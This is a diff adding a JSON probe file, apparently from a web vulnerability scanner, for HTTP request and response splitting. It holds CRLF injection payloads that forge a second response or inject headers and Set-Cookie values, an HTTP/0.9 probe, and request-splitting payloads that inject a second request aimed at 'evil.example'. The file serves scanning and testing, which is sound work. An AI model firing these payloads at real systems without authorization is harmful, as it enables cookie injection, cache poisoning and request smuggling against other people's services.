@@ -1,0 +1,81 @@
+{
+  "category": "request_splitting",
+  "contexts": {
+    "response_splitting": {
+      "description": "HTTP response splitting -- inject CRLF into response headers to create a second attacker-controlled HTTP response",
+      "tech_match": ["PHP", "Python", "Node.js", "Java", "Ruby"],
+      "param_match": ["url", "redirect", "return", "next", "goto", "dest", "location", "host", "ref", "callback", "lang", "page"],
+      "probes": [
+        {
+          "payload": "{{baseline}}%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0aswk-split-{{marker}}",
+          "description": "Full HTTP response splitting -- double CRLF terminates first response, injects complete second response with controlled body",
+          "matchers": [
+            {"type": "word", "words": ["swk-split-"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 80
+        },
+        {
+          "payload": "{{baseline}}%0d%0aX-SWK-Injected: {{marker}}",
+          "description": "Header injection via CRLF -- inject custom header to confirm response splitting prerequisite",
+          "matchers": [
+            {"type": "header", "name": "X-SWK-Injected", "contains": "swk"}
+          ],
+          "severity": "high",
+          "confidence_boost": 60
+        },
+        {
+          "payload": "{{baseline}}%0d%0aSet-Cookie: swk_split={{marker}}; Path=/",
+          "description": "Cookie injection via response splitting -- inject Set-Cookie header to set arbitrary cookies on victim",
+          "matchers": [
+            {"type": "header", "name": "Set-Cookie", "contains": "swk_split"}
+          ],
+          "severity": "high",
+          "confidence_boost": 65
+        }
+      ]
+    },
+    "http_09_response": {
+      "description": "HTTP/0.9 response smuggling -- force server to return HTTP/0.9 response (no headers) so body is interpreted as raw content by intermediary",
+      "tech_match": ["Apache", "Nginx", "Node.js"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "GET {{baseline}} HTTP/0.9\r\nHost: {{host}}\r\n\r\n",
+          "description": "HTTP/0.9 request -- server may respond without status line or headers, raw body interpreted differently by proxy vs browser",
+          "matchers": [
+            {"type": "not_word", "words": ["HTTP/1.0", "HTTP/1.1", "HTTP/2"]},
+            {"type": "status", "status": [200]}
+          ],
+          "severity": "medium",
+          "confidence_boost": 35
+        }
+      ]
+    },
+    "header_injection": {
+      "description": "Request header injection via user-controlled values -- inject headers into outgoing requests made by server-side code",
+      "tech_match": ["Node.js", "Python", "Ruby", "PHP", "Java"],
+      "param_match": ["url", "host", "api", "endpoint", "webhook", "callback", "proxy", "upstream"],
+      "probes": [
+        {
+          "payload": "{{baseline}}%20HTTP/1.1%0d%0aHost:%20evil.example%0d%0a%0d%0aGET%20/swktest-{{marker}}",
+          "description": "Request splitting via space + CRLF -- inject full second request into server-side HTTP client",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 50}
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        },
+        {
+          "payload": "{{baseline}} HTTP/1.1\\r\\nX-Injected: swktest-{{marker}}\\r\\n",
+          "description": "Request splitting via literal escaped CRLF -- some HTTP libraries process escaped \\r\\n as actual CRLF",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 30}
+          ],
+          "severity": "high",
+          "confidence_boost": 40
+        }
+      ]
+    }
+  }
+}
